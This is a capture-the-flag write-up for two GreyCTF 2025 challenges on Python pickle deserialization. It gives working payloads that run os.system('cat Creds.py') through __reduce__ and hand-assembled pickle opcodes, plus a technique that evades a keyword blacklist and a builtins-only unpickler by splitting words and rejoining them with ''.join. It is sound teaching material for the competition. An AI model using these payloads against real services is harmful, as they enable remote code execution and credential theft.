# [MISC] Authlab & Authlab 1.1

## Description (Authlab)

I made an authentication wrapper for services in python. Help me make sure the admin password cannot be leaked.

Distrib: [Dockerfile](https://raw.githubusercontent.com/k-hian/CTFWriteups/refs/heads/main/Grey%20Cat%20The%20Flag%202025/Authlab/distrib/Dockerfile) [server.py](https://raw.githubusercontent.com/k-hian/CTFWriteups/refs/heads/main/Grey%20Cat%20The%20Flag%202025/Authlab/distrib/server.py) [Creds.py](https://raw.githubusercontent.com/k-hian/CTFWriteups/refs/heads/main/Grey%20Cat%20The%20Flag%202025/Authlab/distrib/Creds.py)

### Flag

`grey{4_p1ck13d_p4ssw0rd_s0uNd5_n1C3}`

## Description (Authlab 1.1)

What a pickle... I have disabled EasyCreds while I try to fix it...

Distrib: [Dockerfile](https://raw.githubusercontent.com/k-hian/CTFWriteups/refs/heads/main/Grey%20Cat%20The%20Flag%202025/Authlab/distrib1.1/Dockerfile) [server.py](https://raw.githubusercontent.com/k-hian/CTFWriteups/refs/heads/main/Grey%20Cat%20The%20Flag%202025/Authlab/distrib1.1/server.py) [Creds.py](https://raw.githubusercontent.com/k-hian/CTFWriteups/refs/heads/main/Grey%20Cat%20The%20Flag%202025/Authlab/distrib1.1/Creds.py) [SecurePickle.py](https://raw.githubusercontent.com/k-hian/CTFWriteups/refs/heads/main/Grey%20Cat%20The%20Flag%202025/Authlab/distrib1.1/SecurePickle.py)


### Flag

`grey{4l1_aU7H_n0_p1Ay_M4k3_mE_4_d1ll_8oY}`

## Solution (Authlab)

A simple sanity-check challenge, to introduce players to the world of pickle deserialization vulnerabilities. This is as simple as a pickle challenge can get, without any restrictions or sanitization. The flag is the password of the admin, stored in `Creds.py`.

The only relevant functional code is the following:

```python
# accessible using the `[E] Login with EasyCreds` option in menu
def easyLogin(self):
    user = pickle.loads(b64decode(input("Enter EasyCreds: ")))
```

By using the `__reduce__` function of an object, we can create a simple serialization object that does remote code execution.

```
import os, pickle as p, base64 as b

class Evil:
  def __reduce__(self):
    return (os.system, ('cat Creds.py',))

evil = Evil()
evil_pickle = p.dumps(evil)
evil_token = b.b64encode(evil_pickle)
print(evil_token)
# gASVJwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAxjYXQgQ3JlZHMucHmUhZRSlC4=
```

Using `pickletools`, we can examine the pickle serialization, which might be useful for the next challenge (Authlab 1.1).

```python
from pickletools import dis

dis(evil_pickle, annotate=1)
'''
    0: \x80 PROTO      4 Protocol version indicator.
    2: \x95 FRAME      39 Indicate the beginning of a new frame.
   11: \x8c SHORT_BINUNICODE 'posix' Push a Python Unicode string object.
   18: \x94 MEMOIZE    (as 0)        Store the stack top into the memo.  The stack is not popped.
   19: \x8c SHORT_BINUNICODE 'system' Push a Python Unicode string object.
   27: \x94 MEMOIZE    (as 1)         Store the stack top into the memo.  The stack is not popped.
   28: \x93 STACK_GLOBAL              Push a global object (module.attr) on the stack.
   29: \x94 MEMOIZE    (as 2)         Store the stack top into the memo.  The stack is not popped.
   30: \x8c SHORT_BINUNICODE 'cat Creds.py' Push a Python Unicode string object.
   44: \x94 MEMOIZE    (as 3)               Store the stack top into the memo.  The stack is not popped.
   45: \x85 TUPLE1                          Build a one-tuple out of the topmost item on the stack.
   46: \x94 MEMOIZE    (as 4)               Store the stack top into the memo.  The stack is not popped.
   47: R    REDUCE                          Push an object built from a callable and an argument tuple.
   48: \x94 MEMOIZE    (as 5)               Store the stack top into the memo.  The stack is not popped.
   49: .    STOP                            Stop the unpickling machine.
highest protocol among opcodes = 4
'''
```

We can ignore the `PROTO`, `FRAME` and `MEMOIZE` opcodes, simplifying the expression to:
```python
'''
   11: \x8c SHORT_BINUNICODE 'posix' Push a Python Unicode string object.
   19: \x8c SHORT_BINUNICODE 'system' Push a Python Unicode string object.
   28: \x93 STACK_GLOBAL              Push a global object (module.attr) on the stack.
   30: \x8c SHORT_BINUNICODE 'cat Creds.py' Push a Python Unicode string object.
   45: \x85 TUPLE1                          Build a one-tuple out of the topmost item on the stack.
   47: R    REDUCE                          Push an object built from a callable and an argument tuple.
   49: .    STOP                            Stop the unpickling machine.
'''
```

At offset `28`, `STACK_GLOBAL` pops the top two strings in the stack, resolves them as `module.attr` and pushes the result back into the stack. In this case, `posix.system` where `posix` is equivalent to `__import__('os')`.

Next, we push the code injection `'cat Creds.py'` and put it into a tuple with a single element using `TUPLE1`.

Lastly, `REDUCE` pops a callable and an argument tuple from the top of the stack, applies the callable to the arguments as `callable(*args)` and pushes the result back into the stack. In this case, `posix.system('cat Creds.py')`. Since `os.system` sends the output to the interpreter standard output stream, we don't need to print it.

The payload can also be simplified further to be printable characters, which uses essentially the same idea.

```python
evil_token = b64encode(b"cposix\nsystem\n(S'cat Creds.py'\ntR.")
```

Feeding the token into the server, we get the flag from the admin password dict `{"admin" : "grey{4_p1ck13d_p4ssw0rd_s0uNd5_n1C3}"}`.

Solve scripts: [solve.py](https://raw.githubusercontent.com/k-hian/CTFWriteups/refs/heads/main/Grey%20Cat%20The%20Flag%202025/Authlab/solve/authlab_solve.py)

## Solution (Authlab 1.1)

This is the follow-up to Authlab, with the following additions:

```python
# More secure pickle deserializer
class SecurePickle(pickle.Unpickler):
    def find_class(self, module, name):
        if module != 'builtins' or '.' in name:
            raise KeyError('The pickle is spoilt :(')
        return pickle.Unpickler.find_class(self, module, name)

def loads(s):
    for word in ('os', 'sys', 'system', 'sh', 'cat', 'import', 'open', 'file', 'globals', 'Creds'):
        if word.encode() in s:
            raise KeyError(f'The pickle is spoilt :(')
    return SecurePickle(io.BytesIO(s)).load()

# "ban hammer" that disables a bunch of popular pyjail paths
def BanHammer():
    __builtins__.help = None
    __builtins__.breakpoint = None
    __builtins__.open = None
    __builtins__.exec = None
    __builtins__.eval = None
    __builtins__.compile = None
```

The new restrictions includes a blacklist of a bunch of common pyjail keywords, as well as a new Unpickler that only allows the `builtin` module and disallows periods `.` in the name/attr param (which isn't actually a big deal). I will discuss the idea behind (a slightly better version of) the [original solution](https://github.com/NUSGreyhats/greyctf25-challs-public/blob/main/finals/misc/authlab1.1/solve/solve.py) here. I will be using `pickleassem` to build the payload.

Firstly, we want to run something like `os.system('payload')` like in the first part, which will allow us to read the `Creds.py` file and get the flag. Let's use a (slightly modified) payload from the first part as a starting point.

```python
pa.push_global('posix','system')
pa.pa.push_short_binunicode('cat Creds.py')
pa.build_tuple1()   # builds a tuple of size 1, using the first item on the stack
pa.build_reduce()
```

The first problem we encounter would be the blacklist (which we will tackle later) and whitelisted modules only includes `builtins`. This is a common pyjail starting point, we might be tempted to try to import the module we need using the `__import__` function from the `builtins` module.

```python
pa.push_global('builtins','__import__')
```

But this is where we are truly hindered by the blacklist. We cannot use the word `import`, but we need it to import other more useful modules. Luckily, pickle offers a different op, that allows you to build globals from stack rather than from params.

```python
pa.push_short_binunicode('builtins')
pa.push_short_binunicode('__import__')
pa.build_stack_global()     # equals to    temp=pop();  push_global(pop(), temp)
```

Which means if we are able to you are able to get `__import__` into the stack without triggering the blacklist, then you can import things. For instance, we can split `__import__` into `__imp` and `ort__`, then combine them together. One of two methods probably came to mind, using the `+` operator or using `''.join(args)` function. The original solution uses the `+` operator, which requires importing the `operator` module using the `BuiltinImporter` class from `object.__subclasses__()[120]` by chaining a large number of `getattr` functions. I will showcase the second method brought to my attention by team `SSM2`.

```python
pa.push_global('builtins','getattr')
pa.push_short_binunicode('')
pa.push_short_binunicode('join')
pa.build_tuple2()                   # ('', 'join')
pa.build_reduce()                   # getattr('', 'join') ->  <method join of str obj>
pa.memo_memoize()                   # memoize as 0, for reuse via pa.memo_binget(0)
# pa.pop()              # optional clear stack
```

Using this, we can bypass the blacklist by breaking down any blacklisted words into smaller chunks, then recombining them back together. Eg.

```python
pa.memo_binget(0)           # <method join of str obj>
pa.push_short_binunicode('__imp')
pa.push_short_binunicode('ort__')
pa.build_tuple2()                   # ('__imp','ort__')
pa.build_tuple1()                   # (('__imp','ort__'),)
pa.build_reduce()                   # ''.join(('__imp','ort__')) -> '__import__'
```

For simplicity, lets define some helpers using what we have so far:

```python
mem = 0
joinKey = None
def push_join(pa):
    global joinKey, mem
    if joinKey:
        pa.memo_binget(joinKey)
    else:
        pa.push_global('builtins','getattr')
        pa.push_short_binunicode('')
        pa.push_short_binunicode('join')
        pa.build_tuple2()
        pa.build_reduce()
        pa.memo_memoize()
        joinKey = mem
        mem += 1

def push_word2(pa, w1, w2):
    push_join(pa)
    pa.push_short_binunicode(w1)
    pa.push_short_binunicode(w2)
    pa.build_tuple2()
    pa.build_tuple1()
    pa.build_reduce()

def push_word3(pa, w1, w2, w3):
    push_join(pa)
    push_join(pa)
    pa.push_short_binunicode(w1)
    pa.push_short_binunicode(w2)
    pa.build_tuple2()
    pa.build_tuple1()
    pa.build_reduce()
    pa.push_short_binunicode(w3)
    pa.build_tuple2()
    pa.build_tuple1()
    pa.build_reduce()
```

With that, we can build our payload: (`[...]` represents the stack, top item on the right)

```python
pa = PickleAssembler(proto=4)
pa.push_global('builtins','getattr')
pa.push_short_binunicode('builtins')    # [ getattr  'builtins' ]
push_word2(pa,'__imp', 'ort__')         # [ getattr  'builtins'  '__import__' ]
pa.build_stack_global()                 # [ getattr  __import__ ]
push_word2(pa, 'o', 's')                # [ getattr  __import__  'os' ]
pa.build_tuple1()                       # [ getattr  __import__  ('os',) ]
pa.build_reduce()                       # [ getattr  os ]
push_word2(pa, 'sy', 'stem')            # [ getattr  os  'system' ]
pa.build_tuple2()                       # [ getattr  (os, 'system') ]
pa.build_reduce()                       # [ os.system ]
push_word3(pa, 'ca', 't Cr', 'eds.py')  # [ os.system  'cat Creds.py' ]
pa.build_tuple1()                       # [ os.system  ('cat Creds.py',) ]
pa.build_reduce()                       # executes os.system('cat Creds.py')

from base64 import b64encode
print(f'Payload: {b64encode(pa.assemble())}')
```

Using this, we can get the entire `Creds.py` file, including the flag `grey{4l1_aU7H_n0_p1Ay_M4k3_mE_4_d1ll_8oY}`.

Solve scripts: [original v1](https://raw.githubusercontent.com/k-hian/CTFWriteups/refs/heads/main/Grey%20Cat%20The%20Flag%202025/Authlab/solve/authlab1.1_solve_v1.py) [updated v2](https://raw.githubusercontent.com/k-hian/CTFWriteups/refs/heads/main/Grey%20Cat%20The%20Flag%202025/Authlab/solve/authlab1.1_solve_v2.py)

## Thoughts

I think 8 out of 20 solves was the right difficulty level for the second challenge. I did receive quite a bit of (playful) complains about the challenge being very tedious to solve, requiring the participants to read quite a bit to figure out how to craft pickle payloads. I also learnt from watching the players solve the challenges, such as using `''.join` instead of `operator.add` as the combiner to cut the payload by about 40 chars.

Really enjoyed crafting challenges for GreyCTF, and watching the finalist play over the 24h onsite finals. 